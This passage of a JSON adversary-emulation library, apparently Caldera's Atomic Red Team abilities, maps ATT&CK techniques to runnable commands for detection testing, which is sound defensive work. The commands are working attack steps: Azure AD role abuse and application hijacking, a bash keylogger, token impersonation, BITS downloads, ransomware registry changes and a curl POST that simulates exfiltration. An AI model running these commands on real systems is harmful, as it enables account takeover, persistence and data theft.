-AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential -ErrorAction Ignore; $user = Get-AzureADUser -Filter \"DisplayName eq 'SuperUser' or UserPrincipalName eq 'SuperUser'\"; if ($user -eq $null) { Write-Warning \"User not found\"; exit }; $role = Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Reader'\"; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; Remove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $user.ObjectId; Write-Host \"User $($user.DisplayName) was removed from $($role.DisplayName) role\""], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) { ; } else {Install-Module -Name AzureAD -Force};  ;  Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential; $user = Get-AzureADUser -Filter \"DisplayName eq 'SuperUser' or UserPrincipalName eq 'SuperUser'\"; if ($user -eq $null) { Write-Warning \"User not found\"; exit }; $role = Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Reader'\"; if ($role -eq $null) { Write-Warning \"Role not found\"; exit }; Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId; Write-Host \"User $($user.DisplayName) was added to $($role.DisplayName) role\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Manipulation", "ability_id": "ae8bd61cb6d10568145c87134e95c96f", "technique_id": "T1098", "tactic": "persistence", "requirements": [], "name": "Azure AD - adding user to Azure AD role", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Add a certificate to an Application through its App Registration. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Import-Module -Name AzureAD -ErrorAction Ignore; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null; $app = Get-AzureADApplication -SearchString \"SuperApp\" | Select-Object -First 1; $credz = Get-AzureADApplicationKeyCredential -ObjectId $app.ObjectId; foreach ($cred in $credz) {;   if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"AtomicTest\") {;     Write-Host \"Removed $($cred.KeyId) key from application\";     Remove-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -KeyId $cred.KeyId;   }  ; }; Get-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item; rm \"$env:TEMP\\SuperApp.pfx\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential > $null; $app = Get-AzureADApplication -SearchString \"SuperApp\" | Select-Object -First 1; if ($app -eq $null) { Write-Warning \"Application not found\"; exit }; $certNotAfter = (Get-Date).AddDays(2); $credNotAfter = (Get-Date).AddDays(1); $thumb = (New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation \"cert:\\CurrentUser\\My\" -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter).Thumbprint; Write-Host \"Generated certificate \"\"$thumb\"\"\"; $pwd = ConvertTo-SecureString -String \"Passw0rd\" -Force -AsPlainText; Export-PfxCertificate -cert \"cert:\\CurrentUser\\my\\$thumb\" -FilePath \"$env:TEMP\\SuperApp.pfx\" -Password $pwd > $null; $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate(\"$env:TEMP\\SuperApp.pfx\", $pwd); $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData()); New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter; Start-Sleep -s 30; $tenant = Get-AzureADTenantDetail; $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $thumb; Write-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"; Write-Host \"End of Hijacking\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Manipulation: Additional Cloud Credentials", "ability_id": "c17527c8e46c4a6f1622f61401735407", "technique_id": "T1098.001", "tactic": "persistence", "requirements": [], "name": "Azure AD Application Hijacking - App Registration", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Add a certificate to an Application through its Service Principal. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n", "repeatable": false, "privilege": "", "buckets": ["persistence"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Import-Module -Name AzureAD -ErrorAction Ignore; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential -ErrorAction Ignore > $null; $sp = Get-AzureADServicePrincipal -SearchString \"SuperSP\" | Select-Object -First 1; $credz = Get-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId; foreach ($cred in $credz) {;   if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"AtomicTest\") {;     Write-Host \"Removed $($cred.KeyId) key from SP\";     Remove-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -KeyId $cred.KeyId;   }  ; }; Get-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item; rm \"$env:TEMP\\SuperSP.pfx\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential > $null; $sp = Get-AzureADServicePrincipal -SearchString \"SuperSP\" | Select-Object -First 1; if ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }; $certNotAfter = (Get-Date).AddDays(2); $credNotAfter = (Get-Date).AddDays(1); $thumb = (New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation \"cert:\\CurrentUser\\My\" -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter).Thumbprint; Write-Host \"Generated certificate \"\"$thumb\"\"\"; $pwd = ConvertTo-SecureString -String \"Passw0rd\" -Force -AsPlainText; Export-PfxCertificate -cert \"cert:\\CurrentUser\\my\\$thumb\" -FilePath \"$env:TEMP\\SuperSP.pfx\" -Password $pwd > $null; $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate(\"$env:TEMP\\SuperSP.pfx\", $pwd); $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData()); New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter; Start-Sleep -s 30; $tenant = Get-AzureADTenantDetail; $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $thumb; Write-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"; Write-Host \"End of Hijacking\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Manipulation: Additional Cloud Credentials", "ability_id": "1eef166892fd91bb46844c09f4165518", "technique_id": "T1098.001", "tactic": "persistence", "requirements": [], "name": "Azure AD Application Hijacking - Service Principal", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identifies when an Azure Automation runbook is created or modified. An adversary may create or modify an Azure\nAutomation runbook to execute malicious code and maintain persistence in their target's environment.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd; Connect-AzAccount -Credential $creds; New-AzAutomationRunbook -Name; Remove-AzAutomationRunbook -AutomationAccountName", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Valid Accounts: Cloud Accounts", "ability_id": "e47387106f7e0b3bc8d0d4915684627c", "technique_id": "T1078.004", "tactic": "multiple", "requirements": [], "name": "Azure Persistence Automation Runbook Created or Modified", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Upon successful execution, this test will utilize a valid read-only Azure AD user's credentials to conduct a security scan and determine what users exist in a given tenant, as well as identify any admin users. \nOnce the test is complete, a folder will be output to the temp directory that contains 3 csv files which provide info on the discovered users. \nSee https://github.com/cyberark/SkyArk \n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$resultstime = Get-Date -Format \"yyyyMMdd\"; $resultsfolder = (\"Results-\" + $resultstime); remove-item $env:temp\\$resultsfolder -recurse -force -erroraction silentlycontinue"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "Import-Module $env:temp\\AzureStealth.ps1 -force      ; $Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"None\", $Password; Connect-AzAccount -Credential $Credential; Connect-AzureAD -Credential $Credential; Scan-AzureAdmins -UseCurrentCred", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "9a014cd2d5b303f8e26bf8d92bb33877", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "Azure Security Scan with SkyArk", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "https://github.com/BeichenDream/BadPotato\nPrivilege escalation using named pipe connections", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["taskkill /f /im notepad.exe"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cd $env:temp; Start-Process .\\BadPotato.exe notepad.exe; Start-Sleep -Second 20; Stop-Process -Name \"notepad\" -force -erroraction silentlycontinue; Stop-Process -Name \"BadPotato\" -force -erroraction silentlycontinue", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Access Token Manipulation: Token Impersonation/Theft", "ability_id": "f4ae0566412bb12efb2d03466b4546e7", "technique_id": "T1134.001", "tactic": "multiple", "requirements": [], "name": "Bad Potato", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilizing a common technique for posting base64 encoded data.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "echo -n 111-11-1111 | base64; curl -XPOST MTExLTExLTExMTE=.redcanary.com", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo -n 111-11-1111 | base64; curl -XPOST MTExLTExLTExMTE=.redcanary.com", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Data Encoding: Standard Encoding", "ability_id": "d5c3d4d3a33600ba963db53932e355f7", "technique_id": "T1132.001", "tactic": "command-and-control", "requirements": [], "name": "Base64 Encoded data.", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use Perl to decode a base64-encoded text string and echo it to the console\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "ENCODED=$(perl -e \"use MIME::Base64;print(encode_base64('Hello from Atomic Red Team test T1140!'));\"); perl -le \"use MIME::Base64;print(decode_base64('$ENCODED'));\"; echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'; echo $ENCODED > /tmp/T1140.encoded && perl -le 'use MIME::Base64;open($f,\"<\",\"/tmp/T1140.encoded\");print(decode_base64(<$f>));'", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "ENCODED=$(perl -e \"use MIME::Base64;print(encode_base64('Hello from Atomic Red Team test T1140!'));\"); perl -le \"use MIME::Base64;print(decode_base64('$ENCODED'));\"; echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'; echo $ENCODED > /tmp/T1140.encoded && perl -le 'use MIME::Base64;open($f,\"<\",\"/tmp/T1140.encoded\");print(decode_base64(<$f>));'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Deobfuscate/Decode Files or Information", "ability_id": "b6382bbeb9bd52e48ca7249d30507c9a", "technique_id": "T1140", "tactic": "defense-evasion", "requirements": [], "name": "Base64 decoding with Perl", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use Python to decode a base64-encoded text string and echo it to the console\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(\"Hello from Atomic Red Team test T1140!\".encode());print(enc.decode())'); python3 -c \"import base64;dec=base64.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"; python3 -c \"import base64 as d;dec=d.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"; python3 -c \"from base64 import b64decode;dec=b64decode(\\\"$ENCODED\\\");print(dec.decode())\"; python3 -c \"from base64 import b64decode as d;dec=d(\\\"$ENCODED\\\");print(dec.decode())\"; echo $ENCODED | python3 -c \"import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())\"; echo $ENCODED > /tmp/T1140.encoded && python3 -c \"import base64;dec=base64.b64decode(open('/tmp/T1140.encoded').read());print(dec.decode())\"", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(\"Hello from Atomic Red Team test T1140!\".encode());print(enc.decode())'); python3 -c \"import base64;dec=base64.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"; python3 -c \"import base64 as d;dec=d.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"; python3 -c \"from base64 import b64decode;dec=b64decode(\\\"$ENCODED\\\");print(dec.decode())\"; python3 -c \"from base64 import b64decode as d;dec=d(\\\"$ENCODED\\\");print(dec.decode())\"; echo $ENCODED | python3 -c \"import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())\"; echo $ENCODED > /tmp/T1140.encoded && python3 -c \"import base64;dec=base64.b64decode(open('/tmp/T1140.encoded').read());print(dec.decode())\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Deobfuscate/Decode Files or Information", "ability_id": "58ef43e598c111afc81ba9a22c6af108", "technique_id": "T1140", "tactic": "defense-evasion", "requirements": [], "name": "Base64 decoding with Python", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use common shell utilities to decode a base64-encoded text string and echo it to the console\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | base64); printf $ENCODED | base64 -d; echo $ENCODED | base64 -d; echo $(echo $ENCODED) | base64 -d; echo $ENCODED > /tmp/T1140.encoded && base64 -d /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && base64 -d < /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | base64 -d; echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | base64 -d; bash -c \"{echo,\\\"$(echo $ENCODED)\\\"}|{base64,-d}\"", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | base64); printf $ENCODED | base64 -d; echo $ENCODED | base64 -d; echo $(echo $ENCODED) | base64 -d; echo $ENCODED > /tmp/T1140.encoded && base64 -d /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && base64 -d < /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | base64 -d; echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | base64 -d; bash -c \"{echo,\\\"$(echo $ENCODED)\\\"}|{base64,-d}\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Deobfuscate/Decode Files or Information", "ability_id": "326a9797b0d59b8f6d5a3c384c564b9f", "technique_id": "T1140", "tactic": "defense-evasion", "requirements": [], "name": "Base64 decoding with shell utilities", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. \n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/.keyboard.log"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "trap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" >> /tmp/.keyboard.log' DEBUG; echo \"Hello World!\"; cat /tmp/.keyboard.log", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Input Capture: Keylogging", "ability_id": "d51f79852d358a701aa4fcd3f9cb8adc", "technique_id": "T1056.001", "tactic": "multiple", "requirements": [], "name": "Bash session based keylogger", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net localgroup && net group /domain && net group \"domain admins\" /domain && net group \"enterprise admins\" /domain", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Domain Groups", "ability_id": "6103e503cb444bc7b4187704f2035708", "technique_id": "T1069.002", "tactic": "discovery", "requirements": [], "name": "Basic Permission Groups Discovery Windows (Domain)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net localgroup && net localgroup \"Administrators\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Local Groups", "ability_id": "a1f48fa3ddee658b29b414523c9a295b", "technique_id": "T1069.001", "tactic": "discovery", "requirements": [], "name": "Basic Permission Groups Discovery Windows (Local)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\n\nThe UPX magic number (`0x55505821`, \"`UPX!`\") was changed to (`0x4c4f5452`, \"`LOTR`\"). This prevents the binary from being detected\nby some methods, and especially UPX is not able to uncompress it any more.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["57a8ec_test_upx_header_changed"], "parsers": [], "cleanup": ["rm /tmp/packed_bin"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "cp 57a8ec_test_upx_header_changed /tmp/packed_bin && /tmp/packed_bin", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Obfuscated Files or Information: Software Packing", "ability_id": "2f5cf8c3e8a3a3e6e5621e8f77c5bf65", "technique_id": "T1027.002", "tactic": "defense-evasion", "requirements": [], "name": "Binary packed by UPX, with modified headers", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\n\nThe UPX magic number (`0x55505821`, \"`UPX!`\") was changed to (`0x4c4f5452`, \"`LOTR`\"). This prevents the binary from being detected\nby some methods, and especially UPX is not able to uncompress it any more.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["cc5b6f_test_upx_header_changed"], "parsers": [], "cleanup": ["rm /tmp/packed_bin"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cp cc5b6f_test_upx_header_changed /tmp/packed_bin && /tmp/packed_bin", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Obfuscated Files or Information: Software Packing", "ability_id": "fcc9496cb4228dd4221f3562da1b49a4", "technique_id": "T1027.002", "tactic": "defense-evasion", "requirements": [], "name": "Binary packed by UPX, with modified headers (linux)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\nNo other protection/compression were applied.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["741a31_test_upx"], "parsers": [], "cleanup": ["rm /tmp/packed_bin"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "cp 741a31_test_upx /tmp/packed_bin && /tmp/packed_bin", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Obfuscated Files or Information: Software Packing", "ability_id": "eefa25ef5e2f94020b95d80e31ef2bc9", "technique_id": "T1027.002", "tactic": "defense-evasion", "requirements": [], "name": "Binary simply packed by UPX", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\nNo other protection/compression were applied.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["c92729_test_upx"], "parsers": [], "cleanup": ["rm /tmp/packed_bin"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cp c92729_test_upx /tmp/packed_bin && /tmp/packed_bin", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Obfuscated Files or Information: Software Packing", "ability_id": "3a39bf7d2f51a48b68241bcfaaa0ac6a", "technique_id": "T1027.002", "tactic": "defense-evasion", "requirements": [], "name": "Binary simply packed by UPX (linux)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates using desktopimgdownldr.exe to download a malicious file\ninstead of a desktop or lockscreen background img. The process that actually makes \nthe TCP connection and creates the file on the disk is a svchost process (\u201c-k netsvc -p -s BITS\u201d) \nand not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del C:\\Windows\\Temp\\Personalization\\LockScreenImage\\*.md >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "BITS Jobs", "ability_id": "120efc1cd824a8039d1bde03788cd04a", "technique_id": "T1197", "tactic": "multiple", "requirements": [], "name": "Bits download using desktopimgdownldr.exe (cmd)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload leveraging PowerShell\n\nUpon execution you will find a github markdown file downloaded to the Temp directory\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:TEMP\\bitsadmin2_flag.ps1 -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\\bitsadmin2_flag.ps1", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "BITS Jobs", "ability_id": "5a9be3b1696cc0cce8557f9596547e13", "technique_id": "T1197", "tactic": "multiple", "requirements": [], "name": "Bitsadmin Download (PowerShell)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %temp%\\bitsadmin1_flag.ps1 >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\\bitsadmin1_flag.ps1", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "BITS Jobs", "ability_id": "31a63c6d775c708f307a784f73e1b410", "technique_id": "T1197", "tactic": "multiple", "requirements": [], "name": "Bitsadmin Download (cmd)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v LocalAccountTokenFilterPolicy /f >nul 2>&1 && reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLinkedConnections /f >nul 2>&1 && reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\\ /v LongPathsEnabled /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cmd.exe /c reg add 